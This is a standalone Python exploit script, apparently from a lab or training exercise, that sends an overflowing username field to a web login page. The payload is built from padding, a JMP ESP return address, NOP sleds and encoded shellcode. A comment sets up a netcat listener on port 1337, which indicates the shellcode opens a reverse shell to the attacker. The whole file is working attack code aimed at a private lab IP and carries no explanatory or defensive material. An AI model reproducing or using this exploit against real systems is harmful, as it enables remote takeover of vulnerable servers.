import socket
import os
import sys

bad_char = b"\x00\x0a\x0d\x25\x26\x2b\x3d"
jump_esp_after_little_endian = b"\x83\x0c\x09\x10"
padding_nop = b"\x90" * 16

# nc -nlvp 1337

shell = (b"\xb8\xd7\xc1\xbf\xba\xd9\xe8\xd9\x74\x24\xf4\x5f\x31\xc9"
          b"\xb1\x52\x83\xef\xfc\x31\x47\x0e\x03\x90\xcf\x5d\x4f\xe2"
          b"\x38\x23\xb0\x1a\xb9\x44\x38\xff\x88\x44\x5e\x74\xba\x74"
          b"\x14\xd8\x37\xfe\x78\xc8\xcc\x72\x55\xff\x65\x38\x83\xce"
          b"\x76\x11\xf7\x51\xf5\x68\x24\xb1\xc4\xa2\x39\xb0\x01\xde"
          b"\xb0\xe0\xda\x94\x67\x14\x6e\xe0\xbb\x9f\x3c\xe4\xbb\x7c"
          b"\xf4\x07\xed\xd3\x8e\x51\x2d\xd2\x43\xea\x64\xcc\x80\xd7"
          b"\x3f\x67\x72\xa3\xc1\xa1\x4a\x4c\x6d\x8c\x62\xbf\x6f\xc9"
          b"\x45\x20\x1a\x23\xb6\xdd\x1d\xf0\xc4\x39\xab\xe2\x6f\xc9"
          b"\x0b\xce\x8e\x1e\xcd\x85\x9d\xeb\x99\xc1\x81\xea\x4e\x7a"
          b"\xbd\x67\x71\xac\x37\x33\x56\x68\x13\xe7\xf7\x29\xf9\x46"
          b"\x07\x29\xa2\x37\xad\x22\x4f\x23\xdc\x69\x18\x80\xed\x91"
          b"\xd8\x8e\x66\xe2\xea\x11\xdd\x6c\x47\xd9\xfb\x6b\xa8\xf0"
          b"\xbc\xe3\x57\xfb\xbc\x2a\x9c\xaf\xec\x44\x35\xd0\x66\x94"
          b"\xba\x05\x28\xc4\x14\xf6\x89\xb4\xd4\xa6\x61\xde\xda\x99"
          b"\x92\xe1\x30\xb2\x39\x18\xd3\x7d\x15\xbb\x22\x16\x64\xbb"
          b"\x21\xdf\xe1\x5d\x43\x0f\xa4\xf6\xfc\xb6\xed\x8c\x9d\x37"
          b"\x38\xe9\x9e\xbc\xcf\x0e\x50\x35\xa5\x1c\x05\xb5\xf0\x7e"
          b"\x80\xca\x2e\x16\x4e\x58\xb5\xe6\x19\x41\x62\xb1\x4e\xb7"
          b"\x7b\x57\x63\xee\xd5\x45\x7e\x76\x1d\xcd\xa5\x4b\xa0\xcc"
          b"\x28\xf7\x86\xde\xf4\xf8\x82\x8a\xa8\xae\x5c\x64\x0f\x19"
          b"\x2f\xde\xd9\xf6\xf9\xb6\x9c\x34\x3a\xc0\xa0\x10\xcc\x2c"
          b"\x10\xcd\x89\x53\x9d\x99\x1d\x2c\xc3\x39\xe1\xe7\x47\x49"
          b"\xa8\xa5\xee\xc2\x75\x3c\xb3\x8e\x85\xeb\xf0\xb6\x05\x19"
          b"\x89\x4c\x15\x68\x8c\x09\x91\x81\xfc\x02\x74\xa5\x53\x22"
          b"\x5d")

data = b"username=" + b"A" * 780 + jump_esp_after_little_endian + padding_nop + shell + padding_nop + b"&password=A"

header = (
          b"POST /login HTTP/1.1\r\n"
          b"Host: 192.168.153.131\r\n"
          b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
          b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          b"Accept-Language: en-US,en;q=0.5\r\n"
          b"Referer: http://192.168.153.131/login\r\n"
          b"Connection: close\r\n"
          b"Content-Type: application/x-www-form-urlencoded\r\n"
          b"Content-Length: " + str(len(data)).encode() + b"\r\n"
          b"\r\n"
          )

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.153.131", 80))
expl.send(header+data)
expl.close()
